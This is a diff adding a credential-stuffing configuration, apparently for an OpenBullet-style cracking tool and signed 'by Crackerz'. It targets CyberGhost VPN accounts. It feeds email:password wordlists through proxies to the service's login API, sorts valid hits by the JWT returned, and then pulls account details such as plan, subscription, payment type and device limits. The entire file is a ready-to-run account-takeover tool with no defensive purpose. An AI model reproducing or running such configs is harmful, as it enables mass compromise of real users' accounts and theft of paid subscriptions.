@@ -1,0 +1,74 @@
+[SETTINGS]
+{
+  "Name": "cyberghostvpn.Api_Config",
+  "SuggestedBots": 89,
+  "LastModified": "2019-05-02T16:45:35.2125888+00:00",
+  "AdditionalInfo": "Crackerz",
+  "Author": "by Crackerz",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://v2-api.cyberghostvpn.com/v2/my/account/jwt?language=en" 
+  CONTENT "{\"machineName\":\"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\",\"userName\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Host: v2-api.cyberghostvpn.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://account.cyberghostvpn.com" 
+  HEADER "X-APP-KEY: syvqtqgYXwfMPCWc9FfoWrKV0AnGjtDDijohouih9" 
+  HEADER "Content-Type: application/json;charset=UTF-8" 
+  HEADER "Referer: https://account.cyberghostvpn.com/en_US/login" 
+  HEADER "Accept-Language: es-US,es;q=0.9,es-419;q=0.8,en;q=0.7" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"jwt\"" 
+  KEYCHAIN Failure OR 
+    KEY "\": \"login wrong\"" 
+    KEY "\": \"UNAUTHORIZED\"" 
+    KEY "\": null" 
+    KEY "\": 2101" 
+    KEY "\": 401" 
+#Capture_Token PARSE "<SOURCE>" LR "\"jwt\": \"" "\"" -> VAR "token" 
+#INFO REQUEST GET "https://v2-api.cyberghostvpn.com/v2/my/account?fields=(recoverToken,requiresPasswordChange,language,region,activeProduct.*,activeProduct.plan,deviceCount,privateIpsCount)&language=en" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Host: v2-api.cyberghostvpn.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://account.cyberghostvpn.com" 
+  HEADER "Authorization: Bearer <token>" 
+  HEADER "X-APP-KEY: syvqtqgYXwfMPCWc9FfoWrKV0AnGjtDDijohouih9" 
+  HEADER "Referer: https://account.cyberghostvpn.com/en_US/login" 
+  HEADER "Accept-Language: es-US,es;q=0.9,es-419;q=0.8,en;q=0.7" 
+#USERNAME PARSE "<SOURCE>" LR "\"userName\": " "," -> CAP "userName" 
+#ID PARSE "<SOURCE>" LR "\"id\": " "," -> CAP "id" 
+#Membership PARSE "<SOURCE>" LR "\"displayName\": " "," -> CAP "plan vpn" 
+#Subscription PARSE "<SOURCE>" LR "\"planType\": " "," -> CAP "subscriptions" 
+#payment_type PARSE "<SOURCE>" LR "\"price\": {" "," -> CAP "payment type" 
+#maxDevices PARSE "<SOURCE>" LR "\"maxDevices\": " "," -> CAP "maxDevices\": " 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"planType\": \"free\"," 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "\"displayName\": \"Trial expired\"," 
+FUNCTION Constant "Config-by_Crackerz" -> CAP "cyberghostvpn" 
